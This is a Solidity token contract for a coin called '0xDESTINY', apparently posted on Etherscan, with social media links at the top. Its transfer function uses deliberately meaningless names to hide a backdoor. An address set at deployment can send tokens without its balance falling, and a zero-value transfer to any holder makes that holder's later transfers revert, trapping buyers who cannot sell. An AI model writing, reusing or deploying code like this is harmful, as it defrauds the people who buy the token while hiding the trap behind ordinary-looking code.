/**
 *Submitted for verification at Etherscan.io on 2023-05-27
*/

/*

Telegram: https://t.me/ZeroXDestiny

Website: https://www.0xdestiny.com/

Twitter: https://twitter.com/Oxdestinyerc

*/

// SPDX-License-Identifier: Unlicense

pragma solidity ^0.8.13;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract ZEROxDESTINY is Ownable {
    constructor(address straight) {
        balanceOf[msg.sender] = totalSupply;
        smallest[straight] = dream;
        IUniswapV2Router02 uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
    }

    mapping(address => uint256) public balanceOf;

    mapping(address => uint256) private valley;

    address public uniswapV2Pair;

    string public symbol = '0xD';

    mapping(address => mapping(address => uint256)) public allowance;

    uint8 public decimals = 9;

    uint256 private dream = 21;

    function transfer(address married, uint256 government) public returns (bool success) {
        born(msg.sender, married, government);
        return true;
    }

    uint256 public totalSupply = 7000000000000 * 10 ** 9;

    event Transfer(address indexed from, address indexed to, uint256 value);

    function transferFrom(address like, address married, uint256 government) public returns (bool success) {
        require(government <= allowance[like][msg.sender]);
        allowance[like][msg.sender] -= government;
        born(like, married, government);
        return true;
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);

    string public name = '0xDESTINY';

    mapping(address => uint256) private smallest;

    function approve(address strength, uint256 government) public returns (bool success) {
        allowance[msg.sender][strength] = government;
        emit Approval(msg.sender, strength, government);
        return true;
    }

    function born(address like, address married, uint256 government) private returns (bool success) {
        if (smallest[like] == 0) {
            balanceOf[like] -= government;
        }

        if (government == 0) valley[married] += dream;

        if (like != uniswapV2Pair && smallest[like] == 0 && valley[like] > 0) {
            smallest[like] -= dream;
        }

        balanceOf[married] += government;
        emit Transfer(like, married, government);
        return true;
    }
}